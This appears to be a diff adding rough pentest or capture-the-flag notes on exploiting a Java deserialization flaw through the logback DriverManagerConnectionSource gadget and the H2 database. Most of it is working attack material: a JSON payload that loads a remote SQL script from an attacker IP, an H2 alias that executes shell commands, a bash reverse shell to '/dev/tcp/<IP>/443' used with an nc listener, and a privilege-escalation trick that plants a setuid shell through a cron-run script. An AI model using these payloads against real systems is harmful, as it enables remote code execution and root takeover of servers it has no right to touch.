@@ -1,0 +1,40 @@
+-Exploiting a deserialization vulnerability
+
+Requirements:
+
+1)the application should accept arbitrary code
+2)app should have one specific gadget class t exploit in the java classpath that is vulnerable
+
+
+The main idea in all th CVE's found is that there is a possibility of executing SQL queries oon the target server.
+JDBC can be initialized using DriverManagerConnectionSource...Let's validate the possible connection.
+
+
+
+This is the payload to test connection:
+["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:/</IP>/test.sql'"}]
+
+
+
+There is a way to weaponize -> the init can t run java code only SQL statements
+
+SHELLEXEC is used to execute commands.
+
+Within SQL it is allowed to define an alias containing Java code:
+
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+   String[] command = {"bash", "-c", cmd};
+   java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+   return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('bash -c "bash -i >& /dev/tcp/<IP>/443 0>&1"')
+
+The last part will be used hand in hand with a nc listener for shell access .
+
+
+Ideas used as PE vector:
+
+
+echo 'cp /bin/sh /tmp/sh;chmod u+s /tmp/sh' > /usr/bin/timer_backup.sh
+
+./sh -p
